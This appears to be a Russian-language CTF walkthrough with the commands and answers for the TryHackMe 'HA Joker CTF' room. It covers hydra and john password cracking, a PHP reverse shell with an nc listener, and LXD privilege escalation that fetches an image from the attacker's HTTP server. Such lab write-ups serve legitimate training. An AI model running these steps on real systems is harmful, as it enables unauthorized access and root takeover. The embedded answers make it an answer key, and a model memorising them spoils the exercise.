[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [HA Joker CTF](https://tryhackme.com/r/room/jokerctf) 

Всего 1 заданиe:
## Задание 1
Мы разработали эту лабораторную работу для практики проникновения в сети. Решить эту лабораторную работу не так уж и 
сложно, если у вас есть базовые знания по тестированию на проникновение. Давайте начнем и узнаем, как взломать ее.

Перечисление служб
- Nmap

Грубая сила
- Выполнение Bruteforce на файлах по http
- Выполнение Bruteforce на базовой аутентификации

Взлом хеша
- Выполнение перебора хеша для взлома zip-файла
- Выполнение перебора хеша для взлома пользователя mysql

Эксплуатация
- Получение обратного соединения
- Создание оболочки TTY

Повышение привилегий
- получите права root, воспользовавшись уязвимостями LXD


### Ответьте на вопросы ниже
Перечислить службы на целевой машине.
```commandline
nmap -sSCV <IP>
```
```commandline
Ответ не нужен
```
Какая версия Apache?
```commandline
2.4.29
```
Какой порт на этом компьютере не требует аутентификации с помощью пользователя и пароля?
```commandline
80
```
На этом порту есть файл, который, похоже, секретный. Что это?
```commandline
gobuster dir -u http://jokerctf.thm/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -q -t 15 -x php,html,txt
```
```commandline
secret.txt
```
Есть еще один файл, который раскрывает информацию о бэкэнде. Что это?
```commandline
phpinfo.php
```
При чтении секретного файла мы обнаруживаем разговор, который, кажется, содержит как минимум двух пользователей и некоторые ключевые слова, которые могут быть интересны. Как вы думаете, какой это пользователь?
```commandline
joker
```
Какой порт на этом компьютере должен быть аутентифицирован с помощью базового механизма аутентификации?
```commandline
8080
```
На данный момент у нас есть один пользователь и URL-адрес, который необходимо аутентифицировать, а затем взломать его, чтобы получить пароль. Какой это пароль?
```commandline
hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 <IP> http-get/
```
```commandline
hannah
```
Да!! У нас есть пользователь и пароль, и мы видим блог на базе cms. Теперь проверьте каталоги и файлы в этом порту. Какой каталог выглядит как каталог администратора?
```commandline
gobuster -U joker -P hannah - dir -u http://<IP>:8080/ -w /usr/share/wordlists/dirb/common.txt 
-t 20
```
```commandline
/administrator/
```
Нам нужен доступ к администрированию сайта, чтобы получить оболочку, есть файл резервной копии, Что это за файл?
```commandline
nikto -h http://<IP>:8080/ -id joker:hannah
```
```commandline
backup.zip
```
У нас есть файл резервной копии, и теперь нам нужно поискать некоторую информацию, например, базу данных, файлы 
конфигурации и т. д. Но файл резервной копии, похоже, зашифрован. Какой пароль?
```commandline
zip2john backup.zip > joker.hash
sudo john joker.hash
```
```commandline
hannah
```
Помните, что... Нам нужен доступ к администрированию сайта... Бла-бла-бла. В нашем новом открытии мы видим некоторые файлы, которые содержат компрометирующую информацию, может быть db? окей, а что если мы сделаем восстановление базы данных! В некоторых таблицах должно быть что-то вроде user_table! Что такое супер-пупер user?
```commandline
admin
```
Супер-пупер-юзер! Какой пароль?
```commandline
echo '$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG' > pass.txt
sudo john pass.txt --show
```
```commandline
abcd1234
```
На этом этапе вам следует загрузить обратную оболочку, чтобы получить доступ к оболочке. Кто является владельцем этой сессии?
```commandline
php reverse shell
nc -nvlp 4444
whoami
```
```commandline
www-data
```
Этот пользователь принадлежит к группе, которая отличается от вашей группы. Что это за группа?
```commandline
id
```
```commandline
lxd
```
Создайте оболочку tty.
```commandline
python3 -c 'import pty; pty.spawn("/bin/bash");'
```
```commandline
Ответ не нужен
```
В этом вопросе вам следует провести базовое исследование того, как работают контейнеры Linux (LXD), есть небольшой 
онлайн-урок. Погуглите "lxd try it online". 
```commandline
https://www.hackingarticles.in/lxd-privilege-escalation/
```
```commandline
Ответ не нужен
```
Изучите, как повысить привилегии с помощью разрешений LXD, и проверьте, доступны ли на коробке какие-либо изображения.
```commandline
Ответ не нужен
```
Идея здесь в том, чтобы смонтировать корень файловой системы ОС на контейнере, это должно дать нам доступ к корневому каталогу. Создайте контейнер с привилегией true и смонтируйте корневую файловую систему на /mnt, чтобы получить доступ к каталогу /root на хост-машине.
```commandline
Ответ не нужен
```
Каково имя файла в каталоге /root?
```commandline
lxd init
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
sudo python3 -m http.server 80
cd /tmp
wget http://10.45.54.205:80/alpine-v3.12-x86_64-20200923_0009.tar.gz
lxc image import ./alpine-v3.12-x86_64-20200923_0009.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
ls /root
```
```commandline
final.txt
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)